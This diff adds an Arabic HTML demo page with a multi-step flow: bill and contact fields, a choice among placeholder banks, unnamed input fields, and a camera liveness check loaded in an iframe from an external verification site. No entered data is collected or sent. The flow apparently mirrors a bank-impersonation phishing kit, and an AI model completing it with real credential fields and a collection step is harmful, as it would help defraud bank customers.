@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>heloo</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: #f5f7fb;
+      color: #222;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      margin-top: 20px;
+    }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+      border-radius: 20px;
+      margin: auto;
+      display: block;
+      margin-bottom: 20px;
+    }
+
+    h1,h2,h3 {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    p {
+      text-align: center;
+      line-height: 1.7;
+      color: #666;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: #2563eb;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      opacity: .9;
+    }
+
+    .input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      margin-top: 10px;
+      font-size: 15px;
+    }
+
+    .banks {
+      display: grid;
+      grid-template-columns: repeat(2,1fr);
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .bank {
+      border: 1px solid #ddd;
+      border-radius: 15px;
+      padding: 15px;
+      text-align: center;
+      cursor: pointer;
+      transition: .3s;
+      background: white;
+    }
+
+    .bank:hover {
+      transform: translateY(-5px);
+      border-color: #2563eb;
+    }
+
+    .bank img {
+      width: 70px;
+      margin-bottom: 10px;
+    }
+
+    .page {
+      display: none;
+    }
+
+    .active {
+      display: block;
+      animation: fade .4s ease;
+    }
+
+    @keyframes fade {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ddd;
+      border-top: 6px solid #2563eb;
+      border-radius: 50%;
+      margin: 30px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .success {
+      background: #ecfdf3;
+      color: #166534;
+      padding: 15px;
+      border-radius: 12px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .card.frame-card {
+      padding: 0;
+      overflow: hidden;
+    }
+
+    #verifyFrame {
+      width: 100%;
+      border: 0;
+      display: block;
+      min-height: 100px;
+    }
+
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="page active" id="page1">
+    <div class="card">
+      <img class="logo" src="https://via.placeholder.com/100/2563eb/ffffff?text=DEMO">
+      <h1>مرحبا</h1>
+      <button class="btn" onclick="goToLoading('page2')">
+        بدء الخدمة
+      </button>
+    </div>
+  </div>
+
+  <div class="page" id="loading">
+    <div class="card">
+      <div class="spinner"></div>
+      <h3>جاري التحميل...</h3>
+    </div>
+  </div>
+
+  <div class="page" id="page2">
+    <div class="card">
+      <div class="success"></div>
+      <h2>بيانات تجريبية</h2>
+      <input class="input" placeholder="رقم الفاتورة">
+      <input class="input" placeholder="رقم العمل">
+      <input class="input" placeholder="البريد الإلكتروني">
+      <input class="input" placeholder="رقم الهاتف">
+      <button class="btn" onclick="goToLoading('page3')">
+        متابعة
+      </button>
+    </div>
+  </div>
+
+  <div class="page" id="page3">
+    <div class="card">
+      <h2>اختر البطاقة الترحيبية</h2>
+      <div class="banks">
+        <div class="bank" onclick="selectBank('Alpha')">
+          <img src="https://via.placeholder.com/80?text=A">
+          <div>Alpha Bank</div>
+        </div>
+        <div class="bank" onclick="selectBank('Beta')">
+          <img src="https://via.placeholder.com/80?text=B">
+          <div>Beta Bank</div>
+        </div>
+        <div class="bank" onclick="selectBank('Gamma')">
+          <img src="https://via.placeholder.com/80?text=G">
+          <div>Gamma Bank</div>
+        </div>
+        <div class="bank" onclick="selectBank('Delta')">
+          <img src="https://via.placeholder.com/80?text=D">
+          <div>Delta Bank</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page" id="page4">
+    <div class="card">
+      <h2 id="bankTitle">الثالثة</h2>
+      <input class="input" placeholder="اكتب اي شيء">
+      <input class="input" placeholder="اكتب اي شيء">
+      <input class="input" placeholder="اكتب اي شيء">
+      <button class="btn" onclick="goToVerification('successPage')">
+        تنفيذ العملية التجريبية
+      </button>
+    </div>
+  </div>
+
+  <div class="page" id="verifyPage">
+    <div class="card">
+      <h2>التحقّق من الهوية</h2>
+      <p>اسمح بالوصول إلى الكاميرا واتبع التعليمات أمامك لإكمال العملية.</p>
+    </div>
+    <div class="card frame-card">
+      <iframe
+        id="verifyFrame"
+        title="liveness verification"
+        allow="camera"
+      ></iframe>
+    </div>
+  </div>
+
+  <div class="page" id="successPage">
+    <div class="card">
+      <img class="logo" src="https://via.placeholder.com/100/22c55e/ffffff?text=OK">
+      <p>هذه عملية تجريبية فقط.</p>
+      <button class="btn" onclick="location.reload()">
+        إعادة التجربة
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const VERIFY_ORIGIN = 'https://liveness-verification-gamma.vercel.app';
+  const VERIFY_URL = VERIFY_ORIGIN + '/?embed=1';
+
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(page => {
+      page.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+
+    const frame = document.getElementById('verifyFrame');
+    if (id !== 'verifyPage' && frame.src && frame.src !== 'about:blank') {
+      frame.src = 'about:blank';
+    }
+  }
+
+  function goToLoading(nextPage) {
+    showPage('loading');
+    setTimeout(() => {
+      showPage(nextPage);
+    }, 1800);
+  }
+
+  function selectBank(bankName) {
+    document.getElementById('bankTitle').innerText = bankName;
+    goToLoading('page4');
+  }
+
+  function goToVerification(nextPage) {
+    const frame = document.getElementById('verifyFrame');
+    frame.dataset.next = nextPage || 'successPage';
+    frame.src = VERIFY_URL + '&t=' + Date.now();
+    showPage('verifyPage');
+  }
+
+  window.addEventListener('message', (event) => {
+    if (event.origin !== VERIFY_ORIGIN) return;
+    const msg = event.data;
+    if (!msg || msg.source !== 'liveness-check') return;
+
+    const frame = document.getElementById('verifyFrame');
+
+    if (msg.type === 'success') {
+      const next = frame.dataset.next || 'successPage';
+      goToLoading(next);
+    }
+
+    if (msg.type === 'resize' && typeof msg.height === 'number') {
+      frame.style.height = (msg.height + 4) + 'px';
+    }
+
+    if (msg.type === 'error') {
+      console.warn('liveness verification error:', msg.message);
+    }
+  });
+</script>
+
+</body>
+</html>
